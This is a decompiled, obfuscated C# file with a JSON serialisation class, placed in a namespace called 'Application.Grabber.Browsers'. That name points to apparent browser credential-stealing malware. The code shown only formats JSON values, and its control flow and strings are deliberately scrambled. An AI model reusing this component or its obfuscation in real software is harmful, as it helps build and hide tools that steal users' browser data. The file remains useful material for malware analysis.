using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace Application.Grabber.Browsers
{
	// Token: 0x0200002E RID: 46
	public class JsonPrimitive : JsonValue
	{
		// Token: 0x1700003F RID: 63
		// (get) Token: 0x06000166 RID: 358 RVA: 0x000098DC File Offset: 0x00007ADC
		public object Value
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			get
			{
				return this.value;
			}
		}

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x06000167 RID: 359 RVA: 0x000098F0 File Offset: 0x00007AF0
		public override JsonType JsonType
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			get
			{
				for (;;)
				{
					int num = delegate0da.f0000d7(-3);
					for (;;)
					{
						TypeCode typeCode;
						switch (num)
						{
						case 0:
							goto IL_6F;
						case 1:
							goto IL_B0;
						case 2:
							if (typeCode != TypeCode.DateTime && typeCode != TypeCode.String)
							{
								num = delegate0da.f0000d7(-1);
								continue;
							}
							return JsonType.f000029;
						case 3:
							if (this.value == null)
							{
								return JsonType.f000029;
							}
							goto IL_6F;
						}
						break;
						IL_6F:
						typeCode = Type.GetTypeCode(this.value.GetType());
						switch (typeCode)
						{
						case TypeCode.Object:
						case TypeCode.Char:
							return JsonType.f000029;
						case TypeCode.DBNull:
							return JsonType.Number;
						case TypeCode.Boolean:
							return JsonType.Boolean;
						default:
							num = delegate0da.f0000d7(-2);
							break;
						}
					}
				}
				return JsonType.f000029;
				IL_B0:
				return JsonType.Number;
			}
		}

		// Token: 0x06000168 RID: 360 RVA: 0x000099B8 File Offset: 0x00007BB8
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(bool value)
		{
			this.value = value;
		}

		// Token: 0x06000169 RID: 361 RVA: 0x000099CC File Offset: 0x00007BCC
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(byte value)
		{
			this.value = value;
		}

		// Token: 0x0600016A RID: 362 RVA: 0x000099E0 File Offset: 0x00007BE0
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(char value)
		{
			this.value = value;
		}

		// Token: 0x0600016B RID: 363 RVA: 0x000099F4 File Offset: 0x00007BF4
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(decimal value)
		{
			this.value = value;
		}

		// Token: 0x0600016C RID: 364 RVA: 0x00009A08 File Offset: 0x00007C08
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(double value)
		{
			this.value = value;
		}

		// Token: 0x0600016D RID: 365 RVA: 0x00009A1C File Offset: 0x00007C1C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(float value)
		{
			this.value = value;
		}

		// Token: 0x0600016E RID: 366 RVA: 0x00009A30 File Offset: 0x00007C30
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(int value)
		{
			this.value = value;
		}

		// Token: 0x0600016F RID: 367 RVA: 0x00009A44 File Offset: 0x00007C44
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(long value)
		{
			this.value = value;
		}

		// Token: 0x06000170 RID: 368 RVA: 0x00009A58 File Offset: 0x00007C58
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(sbyte value)
		{
			this.value = value;
		}

		// Token: 0x06000171 RID: 369 RVA: 0x00009A6C File Offset: 0x00007C6C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(short value)
		{
			this.value = value;
		}

		// Token: 0x06000172 RID: 370 RVA: 0x00009A80 File Offset: 0x00007C80
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(string value)
		{
			this.value = value;
		}

		// Token: 0x06000173 RID: 371 RVA: 0x00009A90 File Offset: 0x00007C90
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(DateTime value)
		{
			this.value = value;
		}

		// Token: 0x06000174 RID: 372 RVA: 0x00009AA4 File Offset: 0x00007CA4
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(uint value)
		{
			this.value = value;
		}

		// Token: 0x06000175 RID: 373 RVA: 0x00009AB8 File Offset: 0x00007CB8
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(ulong value)
		{
			this.value = value;
		}

		// Token: 0x06000176 RID: 374 RVA: 0x00009ACC File Offset: 0x00007CCC
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(ushort value)
		{
			this.value = value;
		}

		// Token: 0x06000177 RID: 375 RVA: 0x00009AE0 File Offset: 0x00007CE0
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(DateTimeOffset value)
		{
			this.value = value;
		}

		// Token: 0x06000178 RID: 376 RVA: 0x00009AF4 File Offset: 0x00007CF4
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(Guid value)
		{
			this.value = value;
		}

		// Token: 0x06000179 RID: 377 RVA: 0x00009B08 File Offset: 0x00007D08
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(TimeSpan value)
		{
			this.value = value;
		}

		// Token: 0x0600017A RID: 378 RVA: 0x00009B1C File Offset: 0x00007D1C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(Uri value)
		{
			this.value = value;
		}

		// Token: 0x0600017B RID: 379 RVA: 0x00009B2C File Offset: 0x00007D2C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public JsonPrimitive(object value)
		{
			this.value = value;
		}

		// Token: 0x0600017C RID: 380 RVA: 0x00009B3C File Offset: 0x00007D3C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public override void Save(Stream stream, bool parsing)
		{
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					switch (num)
					{
					case 0:
						goto IL_D5;
					case 1:
						return;
					case 2:
						goto IL_36;
					case 3:
					{
						JsonType jsonType = this.JsonType;
						if (jsonType == JsonType.f000029)
						{
							goto IL_36;
						}
						if (jsonType != JsonType.Boolean)
						{
							goto IL_F2;
						}
						if ((bool)this.value)
						{
							num = delegate0da.f0000d7(0);
							continue;
						}
						goto IL_E3;
					}
					}
					break;
					IL_36:
					stream.WriteByte(34);
					byte[] array = delegate0d7.f0000d1(delegate0d6.f0000cb(), base.EscapeString(this.value.ToString()));
					delegate0109.f000132(stream, array, 0, array.Length);
					delegate0107.f00012e(stream, 34);
					num = delegate0da.f0000d7(-1);
				}
			}
			IL_D5:
			stream.Write(JsonPrimitive.true_bytes, 0, 4);
			return;
			IL_E3:
			stream.Write(JsonPrimitive.false_bytes, 0, 5);
			return;
			IL_F2:
			byte[] bytes = Encoding.UTF8.GetBytes(this.GetFormattedString());
			delegate0109.f000132(stream, bytes, 0, bytes.Length);
		}

		// Token: 0x0600017D RID: 381 RVA: 0x00009C5C File Offset: 0x00007E5C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public string GetFormattedString()
		{
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					switch (num)
					{
					case 0:
						goto IL_100;
					case 1:
						goto IL_144;
					case 2:
						goto IL_36;
					case 3:
					{
						JsonType jsonType = this.JsonType;
						if (jsonType != JsonType.f000029)
						{
							if (jsonType != JsonType.Number)
							{
								goto Block_6;
							}
							if (this.value is float)
							{
								goto IL_144;
							}
							if (this.value is double)
							{
								num = delegate0da.f0000d7(-1);
								continue;
							}
							goto IL_16D;
						}
						else
						{
							if (!(this.value is string))
							{
								num = delegate0da.f0000d7(0);
								continue;
							}
							goto IL_10B;
						}
						break;
					}
					}
					break;
				}
			}
			IL_36:
			if (this.value is char)
			{
				return this.value.ToString();
			}
			string str = c0000c0.m00000f("Öd9\"É\u001b^VØ\u0006+H[ã?\u000eøåN\0_«w\u008d%ß\u001b«r\u0098\u0097ÏmRj");
			Type type = this.value.GetType();
			throw new NotImplementedException(str + ((type != null) ? type.ToString() : null));
			Block_6:
			throw new InvalidOperationException();
			IL_100:
			if (this.value != null)
			{
				goto IL_36;
			}
			IL_10B:
			string text = this.value as string;
			if (delegate0d2.f0000c0(text))
			{
				return c0000c0.m00000f("ÿt!\b");
			}
			return text.Trim(new char[]
			{
				'"'
			});
			IL_144:
			string text2 = ((IFormattable)this.value).ToString(c0000c0.m00000f("Ã"), delegate010a.f000134());
			goto IL_191;
			IL_16D:
			text2 = ((IFormattable)this.value).ToString(c0000c0.m00000f("Ö"), delegate010a.f000134());
			IL_191:
			string text3 = text2;
			if (delegate0db.f0000d8(text3, c0000c0.m00000f("ß`\u0003")) || delegate0db.f0000d8(text3, c0000c0.m00000f("Øo+\rÈ\0GN")) || delegate0db.f0000d8(text3, c0000c0.m00000f("¼H#\u0002Ï\aZCÕ")))
			{
				return c0000c0.m00000f("³") + text3 + c0000c0.m00000f("³");
			}
			return text3;
		}

		// Token: 0x0600017E RID: 382 RVA: 0x00009E68 File Offset: 0x00008068
		// Note: this type is marked as 'beforefieldinit'.
		static JsonPrimitive()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
			JsonPrimitive.true_bytes = delegate0d7.f0000d1(delegate0d6.f0000cb(), c0000c0.m00000f("ås8\u0001"));
			JsonPrimitive.false_bytes = delegate0d7.f0000d1(delegate0d6.f0000cb(), c0000c0.m00000f("÷`!\u0017Ã"));
		}

		// Token: 0x04000072 RID: 114
		private object value;

		// Token: 0x04000073 RID: 115
		private static readonly byte[] true_bytes;

		// Token: 0x04000074 RID: 116
		private static readonly byte[] false_bytes;
	}
}
